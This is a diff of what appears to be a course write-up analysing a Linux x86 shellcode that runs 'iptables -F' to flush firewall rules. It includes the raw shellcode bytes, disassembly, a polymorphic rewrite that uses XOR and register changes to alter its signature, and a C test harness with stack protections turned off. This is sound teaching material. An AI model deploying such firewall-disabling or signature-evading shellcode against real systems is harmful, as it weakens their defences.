@@ -42,7 +42,6 @@ First, we need to analyze the original shellcode:
 echo -ne "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" > shellcode.bin
 
 ndisasm -b 32 -p intel shellcode.bin
-
 ```
 
 Follows the output of `ndisasm`:
@@ -79,7 +78,6 @@ Follows the output of `ndisasm`:
 00000020  50                push eax
 00000021  56                push esi
 00000022  53                push ebx
-
 ```
 
 So far, the author of this shellcode pushed the string `///sbin/iptables` to the stack, saving its pointer into the register `EBX`, which is going be used by `execve` as the **1st argument** of `iptables`.
@@ -97,7 +95,6 @@ int execve(
   // array of environment variables
   char *const envp[]
 );
-
 ```
 
 In this case `EBX` is `pathname`, i.e. a pointer to a string indicating the executable to run.
@@ -110,7 +107,6 @@ On the stack, it would look like this:
 ; *ebx -> '///sbin/iptables'
 ; *esi -> '-F'
 ; 0x00000000
-
 ```
 
 Follows the rest of the disassembly:
@@ -128,7 +124,6 @@ Follows the rest of the disassembly:
                             ; call execve syscall
 00000027  B00B              mov al,0xb
 00000029  CD80              int 0x80
-
 ```
 
 These instructions employ `execve` to run the command `///sbin/iptables -F`.
@@ -205,7 +200,6 @@ _start:
 
     ; call execve
     int 0x80
-
 ```
 
 Now let me describe the changes. First, I've changed the following instructions...
@@ -222,7 +216,6 @@ _start:
     push word 0x462d
     mov esi,esp
     push eax
-
 ```
 
 ...into this:
@@ -245,7 +238,6 @@ _start:
     ; instead of pushing the WORD 0x462d, use two steps
     mov di, 0x462d
     push di
-
 ```
 
 Starting from the beginning, instead of clearing only the register `EAX`, I'm also clearing `EBX` and `EDX`.
@@ -264,7 +256,6 @@ After that:
   
     ; use EBX or EDX instead of EAX
     push edx
-
 ```
 
 Instead of saving the pointer to the string `-F` into the register `ESI`, I'm using the register `EDI`, thus changing the bytes of the shellcode.
@@ -290,7 +281,6 @@ Follows the next piece of assembly code to analyze:
 
     push 0x014d4c5b
     xor [esp], esi
-
 ```
 
 This one differs the most in my opinion, and it's also the reason behind the increment of `11 bytes` compared to the original shellcode.
@@ -318,7 +308,6 @@ Follows the second-to-last piece of Assembly code:
 
     push edi
     push ebx
-
 ```
 
 Starting from the top, I used the `PUSH-POP` technique, instead of the instruction `mov ebx, esp`, as it changes the resulting bytes, while using the same number of bytes.
@@ -339,7 +328,6 @@ Finally, it's time to analyze the last piece of Assembly code:
 
     ; call execve
     int 0x80
-
 ```
 
 At the end of the original shellcode there's the instruction `mov al, 0xb`.
@@ -372,14 +360,12 @@ main()
     int (*ret)() = (int(*)())code;
     ret();
 }
-
 ```
 
 To compile:
 
 ```bash
 gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
-
 ```
 
 Once I've run it, I could confirm it executes `iptables -F` successfully:
@@ -391,7 +377,6 @@ rbct@slae:~/exam/assignment_6/3$ sudo strace -e trace=execve ./test_polymorphic_
 # execve("///sbin/iptables", ["///sbin/iptables", "-F"], [/* 0 vars */]) = 0
 
 rbct@slae:~/exam/assignment_6/3$
-
 ```
 
 As you can see, it confirms the length of the shellcode is `58 bytes`.
